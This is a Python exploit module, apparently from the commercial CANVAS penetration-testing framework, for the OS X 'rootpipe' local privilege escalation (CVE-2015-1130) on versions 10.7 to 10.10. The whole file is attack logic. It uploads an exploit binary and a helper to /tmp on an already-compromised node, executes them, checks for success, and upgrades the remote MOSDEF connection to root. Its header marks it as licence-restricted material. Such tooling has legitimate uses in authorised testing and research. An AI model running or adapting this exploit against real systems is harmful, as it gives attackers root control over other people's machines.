#!/usr/bin/env python

# The information provided below is only available to subscribers of Immunity's Early Updates
# and is subject to the terms of the Immunity CANVAS Software License Agreement located here:
#
# https://www.immunityinc.com/downloads/license.txt
#
# It is the customer's responsibility to maintain the confidentiality of this information, and
# any tools, techniques, or information provided as part of the Immunity's CANVAS Early Update
# Program.

# This information is not for re-release to any third party, including contractors, consultants,
# and temporary workers.

import sys
import time

from exploitutils import *
from canvaserror import *

from ExploitTypes.osxLocalExploit import osxLocalExploit
from osxNode import osxNode

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'OS X XPC Admin Framework (rootpipe) local privilege escalation'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Apple'
DOCUMENTATION['Repeatability'] = 'Multiple Times'
DOCUMENTATION['CVE Name']      = 'CVE-2015-1130'
DOCUMENTATION['CVE Url']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1130'
DOCUMENTATION['References']    = 'https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Mac OS X', 'All'] ]
PROPERTY['VERSION']            = [ '10.7', '10.8', '10.9', '10.10' ]

DOCUMENTATION['Notes']         = """

This is a local privilege escalation affecting all Mac OS X versions from 10.7
up to 10.10.2. We provide both a 32bit and 64bit version of the exploit.

Tested on:
- 10.10.1
- 10.9.5
- 10.9.4
- 10.9.3
- 10.9.2
- 10.9.1
- 10.9
- 10.7.2
"""

class theexploit(osxLocalExploit):
    def __init__(self):
        osxLocalExploit.__init__(self)
        self.name               = NAME
        self.node               = None
        self.local_res          = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_helper       = self.local_helper_64
        self.local_exp          = os.path.join(self.local_res, 'x_')
        self.remote_exp         = '/tmp/x'
        self.remote_helper      = '/tmp/h'

    def run(self):
        for node in self.argsDict['passednodes']:
            self.node = node
            self.setInfo("%s (in progress on node %s)" % (self.name, self.node))

            if self.node.shell is None:
                self.log_error("Node has no shell server available")
                self.log_error("Bailing")
                self.setInfo("%s Bailing (Node has no shell server available)" % (self.name))
                continue

            if not self.is_osx_node():
                continue

            if self.is_64bit_node():
                self.local_exp += "64"
                self.log_info("Targeting 64bit OS X")
            elif self.is_32bit_node():
                self.log_info("Targeting 32bit OS X")
                self.local_exp += "32"
                self.local_helper = self.local_helper_32
            else:
                self.log_error("Unsupported node type")
                continue

            if self.compromised(self.remote_helper, 0):
                self.nlog('Already compromised')
                self.nlog('Initing elevated MOSDEF loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.nlog('Done')
                self.cleanup()
                self.setInfo("%s Done (Success)" % (self.name))
                self.setProgress(100)
                continue

            self.log_info('Uploading helper and exploit')
            if self.nodeUpload(self.local_exp, self.remote_exp) == False:
                self.setInfo("%s Done (Failed to upload exploit)" % (self.name))
                continue
            self.setProgress(30)

            if self.nodeUpload(self.local_helper, self.remote_helper) == False:
                self.setInfo("%s Done (Failed to upload helper)" % (self.name))
                continue
            self.setProgress(60)

            self.nlog('Executing exploit')
            args = {"string_1": self.remote_helper, "string_2": self.remote_helper}
            self.fork_and_exec(self.remote_exp, argv = args)
            self.nlog('Waiting...')

            self.setProgress(90)

            # wait 5 secs for the exploit to complete
            wait_secs = 4
            if self.compromised(self.remote_helper, wait_secs):
                self.log_info('Compromised!')
                self.nlog('Upgrading MOSDEF connection loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.nlog('Done')
                self.setInfo("%s Done (Success)" % (self.name))
            else:
                self.log_error('Looks like we failed, try again!')
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)

            self.cleanup()

        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
